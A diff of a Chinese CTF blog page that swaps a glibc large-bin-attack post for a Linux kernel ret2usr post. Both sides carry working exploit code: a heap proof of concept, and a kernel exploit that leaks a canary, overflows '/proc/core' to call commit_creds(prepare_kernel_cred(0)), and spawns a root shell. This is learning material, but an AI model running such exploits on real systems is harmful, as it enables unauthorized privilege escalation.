@@ -108,24 +108,24 @@
 
 
 
-  <meta name="description" content="这两天去看了下large bin attack的一些东西，有一种攻击方法比较没用，只是能alloc自己控制的chunk里面的内容，但是这个unsorted bin也可以做到，不用这么麻烦 然后记忆中0ctf quals有一题heapstorm2也是 large bin attack，于是去看了下 这里给下dalao的博客 Largebin 学习 真的讲得不错 然后看到heapstorm2的解析，真">
+  <meta name="description" content="还是同一道题，这次用不同的做法 看到题目没开smep，所以就试着用ret2usr，网上搜了一圈，好像也没什么资料 但是有比较粗略的介绍说是劫持控制流到用户空间，于是测试了下，发现还真的能直接返回 能直接返回那就不用辛辛苦苦的去构造rop链了 直接调用commit_creds(prepare_kernel_cred (0));就完事了 poc如下 12345678910111213141516171">
 <meta property="og:type" content="article">
-<meta property="og:title" content="large bin attack 学习记录">
-<meta property="og:url" content="https://charlieleex.github.io/2018/08/15/large-bin-attack-学习记录/index.html">
+<meta property="og:title" content="linux kernel pwn 初探(4) ret2usr">
+<meta property="og:url" content="https://charlieleex.github.io/2018/10/09/linux-kernel-pwn-初探-4/index.html">
 <meta property="og:site_name" content="PWN? PWN!">
-<meta property="og:description" content="这两天去看了下large bin attack的一些东西，有一种攻击方法比较没用，只是能alloc自己控制的chunk里面的内容，但是这个unsorted bin也可以做到，不用这么麻烦 然后记忆中0ctf quals有一题heapstorm2也是 large bin attack，于是去看了下 这里给下dalao的博客 Largebin 学习 真的讲得不错 然后看到heapstorm2的解析，真">
+<meta property="og:description" content="还是同一道题，这次用不同的做法 看到题目没开smep，所以就试着用ret2usr，网上搜了一圈，好像也没什么资料 但是有比较粗略的介绍说是劫持控制流到用户空间，于是测试了下，发现还真的能直接返回 能直接返回那就不用辛辛苦苦的去构造rop链了 直接调用commit_creds(prepare_kernel_cred (0));就完事了 poc如下 12345678910111213141516171">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2018-08-15T02:01:05.939Z">
+<meta property="og:updated_time" content="2018-10-09T14:07:03.435Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="large bin attack 学习记录">
-<meta name="twitter:description" content="这两天去看了下large bin attack的一些东西，有一种攻击方法比较没用，只是能alloc自己控制的chunk里面的内容，但是这个unsorted bin也可以做到，不用这么麻烦 然后记忆中0ctf quals有一题heapstorm2也是 large bin attack，于是去看了下 这里给下dalao的博客 Largebin 学习 真的讲得不错 然后看到heapstorm2的解析，真">
+<meta name="twitter:title" content="linux kernel pwn 初探(4) ret2usr">
+<meta name="twitter:description" content="还是同一道题，这次用不同的做法 看到题目没开smep，所以就试着用ret2usr，网上搜了一圈，好像也没什么资料 但是有比较粗略的介绍说是劫持控制流到用户空间，于是测试了下，发现还真的能直接返回 能直接返回那就不用辛辛苦苦的去构造rop链了 直接调用commit_creds(prepare_kernel_cred (0));就完事了 poc如下 12345678910111213141516171">
 
 
 
 
 
 
-  <link rel="canonical" href="https://charlieleex.github.io/2018/08/15/large-bin-attack-学习记录/"/>
+  <link rel="canonical" href="https://charlieleex.github.io/2018/10/09/linux-kernel-pwn-初探-4/"/>
 
 
 
@@ -135,7 +135,7 @@
   };
 </script>
 
-  <title>large bin attack 学习记录 | PWN? PWN!</title>
+  <title>linux kernel pwn 初探(4) ret2usr | PWN? PWN!</title>
   
 
 
@@ -280,7 +280,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://charlieleex.github.io/2018/08/15/large-bin-attack-学习记录/">
+    <link itemprop="mainEntityOfPage" href="https://charlieleex.github.io/2018/10/09/linux-kernel-pwn-初探-4/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Charlie">
@@ -297,7 +297,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">large bin attack 学习记录
+          <h1 class="post-title" itemprop="name headline">linux kernel pwn 初探(4) ret2usr
               
             
           </h1>
@@ -322,7 +322,7 @@
                 
               
 
-              <time title="Created: 2018-08-15 09:51:07 / Modified: 10:01:05" itemprop="dateCreated datePublished" datetime="2018-08-15T09:51:07+08:00">2018-08-15</time>
+              <time title="Created: 2018-10-09 21:52:25 / Modified: 22:07:03" itemprop="dateCreated datePublished" datetime="2018-10-09T21:52:25+08:00">2018-10-09</time>
             
 
             
@@ -360,18 +360,13 @@
       
 
       
-        <p>这两天去看了下large bin attack的一些东西，有一种攻击方法比较没用，只是能alloc自己控制的chunk里面的内容，但是这个unsorted bin也可以做到，不用这么麻烦</p>
-<p>然后记忆中0ctf quals有一题heapstorm2也是 large bin attack，于是去看了下</p>
-<p>这里给下dalao的博客</p>
-<p><a href="https://veritas501.space/2018/04/11/Largebin%20%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">Largebin 学习</a></p>
-<p>真的讲得不错</p>
-<p>然后看到heapstorm2的解析，真的惊为天人，非常优雅的攻击方法</p>
-<p>总结一下，大概就是unsorted bin 插入large bin list的时候，会触发一个任意地址写堆地址</p>
-<p>然后跳出unsorted bin 循环之后，还会有一个任意地址写堆地址</p>
-<p>然后可以伪造一个大小为0x50的chunk</p>
-<p>这个时候就相当于可以alloc到任意想要的地方</p>
-<p>攻击方法可以总结为下面的c语言代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys/mman.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    //only for init</span><br><span class="line">    setbuf(stdin,0);</span><br><span class="line">    setbuf(stdout,0);</span><br><span class="line"></span><br><span class="line">    //map a fixed address memory</span><br><span class="line">    mmap((void*)0x13370000,0x1000,3,34,-1,0);</span><br><span class="line"></span><br><span class="line">    //malloc 2 large bin</span><br><span class="line">    long long* h1=malloc(0x418);</span><br><span class="line">    malloc(0x18);</span><br><span class="line">    long long* h2=malloc(0x428);</span><br><span class="line">    malloc(0x18);</span><br><span class="line">    </span><br><span class="line">    //make the small one into large bin list</span><br><span class="line">    free(h1);</span><br><span class="line">    malloc(0x500);</span><br><span class="line"></span><br><span class="line">    //make the bigger one into unsorted bin list</span><br><span class="line">    free(h2);</span><br><span class="line">    </span><br><span class="line">    //change the small one&apos;s bk and bk_nextsize ,the 0xdeadbeef only show that fd and fd_nextsize doesn&apos;t matter</span><br><span class="line">    </span><br><span class="line">    h1[0]=0xdeadbeef;</span><br><span class="line">    h1[1]=0x13370000-0x10+3;</span><br><span class="line">    h1[2]=0xdeadbeef;</span><br><span class="line">    h1[3]=0x13370018-0x20;</span><br><span class="line"></span><br><span class="line">    //change the unsorted bin&apos;s bk</span><br><span class="line">    h2[0]=0xdeadbeef;</span><br><span class="line">    h2[1]=0x13370000;</span><br><span class="line">    </span><br><span class="line">    //triger the bug and alloc where you want, but it need your luck</span><br><span class="line">    long long * h3=malloc(0x48);</span><br><span class="line">    printf(&quot;you are luck and get %p\n&quot;,h3);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+        <p>还是同一道题，这次用不同的做法</p>
+<p>看到题目没开smep，所以就试着用ret2usr，网上搜了一圈，好像也没什么资料</p>
+<p>但是有比较粗略的介绍说是劫持控制流到用户空间，于是测试了下，发现还真的能直接返回</p>
+<p>能直接返回那就不用辛辛苦苦的去构造rop链了</p>
+<p>直接调用commit_creds(prepare_kernel_cred (0));就完事了</p>
+<p>poc如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys/ioctl.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">int * commit_creds;</span><br><span class="line">int * base_addr;</span><br><span class="line">int * prepare_kernel_cred;</span><br><span class="line">int * ret2ioctl;</span><br><span class="line"></span><br><span class="line">void poc()</span><br><span class="line">&#123;</span><br><span class="line">    __asm__(&quot;mov rdi,0;&quot;</span><br><span class="line">            &quot;call [prepare_kernel_cred];&quot;</span><br><span class="line">            &quot;mov rdi,rax;&quot;</span><br><span class="line">            &quot;call [commit_creds];&quot;</span><br><span class="line">            &quot;pop rbp;&quot;</span><br><span class="line">            &quot;jmp [ret2ioctl];&quot;</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    FILE* base=popen(&quot;grep startup_64 /tmp/kallsyms |awk -F&apos; &apos; &apos;&#123;print $1&#125;&apos;&quot;,&quot;r&quot;);</span><br><span class="line">    fscanf(base,&quot;%p&quot;,&amp;base_addr);</span><br><span class="line">    commit_creds=(long unsigned int)base_addr+0x9c8e0;</span><br><span class="line">    prepare_kernel_cred=(long unsigned int)base_addr+0x9cce0;</span><br><span class="line"></span><br><span class="line">    printf(&quot;base_addr is %lx\n&quot;,base_addr);</span><br><span class="line">    printf(&quot;commit_creds is %lx\n&quot;,commit_creds);</span><br><span class="line">    printf(&quot;prepare is %lx\n&quot;,prepare_kernel_cred);</span><br><span class="line"></span><br><span class="line">    fclose(base);</span><br><span class="line">    int fd = open(&quot;/proc/core&quot;,O_WRONLY);</span><br><span class="line"></span><br><span class="line">    if(fd&lt;0)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;open core failed\n&quot;);</span><br><span class="line">        exit(-1);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    ioctl(fd,0x6677889C,0x40); //set offset</span><br><span class="line">    long long canary[0x10];</span><br><span class="line">    long long payload[0x40]; </span><br><span class="line">  </span><br><span class="line">    ioctl(fd,0x6677889B,canary); //get canary</span><br><span class="line">   </span><br><span class="line">    ret2ioctl=canary[2];</span><br><span class="line">     </span><br><span class="line">    payload[8]=canary[0];</span><br><span class="line">    payload[9]=canary[1];</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    payload[10]=poc;</span><br><span class="line"></span><br><span class="line">    write(fd,payload,0x200);</span><br><span class="line">    long long v=0xffffffff00000058;</span><br><span class="line">    ioctl(fd,0x6677889A,v);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    system(&quot;/bin/sh&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
       
     </div>
 
@@ -398,8 +393,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/07/29/pwn从入门到放弃第六章——简单ROP/" rel="next" title="pwn从入门到放弃第六章——简单ROP">
-                <i class="fa fa-chevron-left"></i> pwn从入门到放弃第六章——简单ROP
+              <a href="/2018/10/09/linux-kernel-pwn-初探-3/" rel="next" title="linux kernel pwn 初探(3) ROP">
+                <i class="fa fa-chevron-left"></i> linux kernel pwn 初探(3) ROP
               </a>
             
           </div>
@@ -407,10 +402,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/09/16/AFL-fuzz-初探/" rel="prev" title="AFL fuzz 初探">
-                AFL fuzz 初探 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
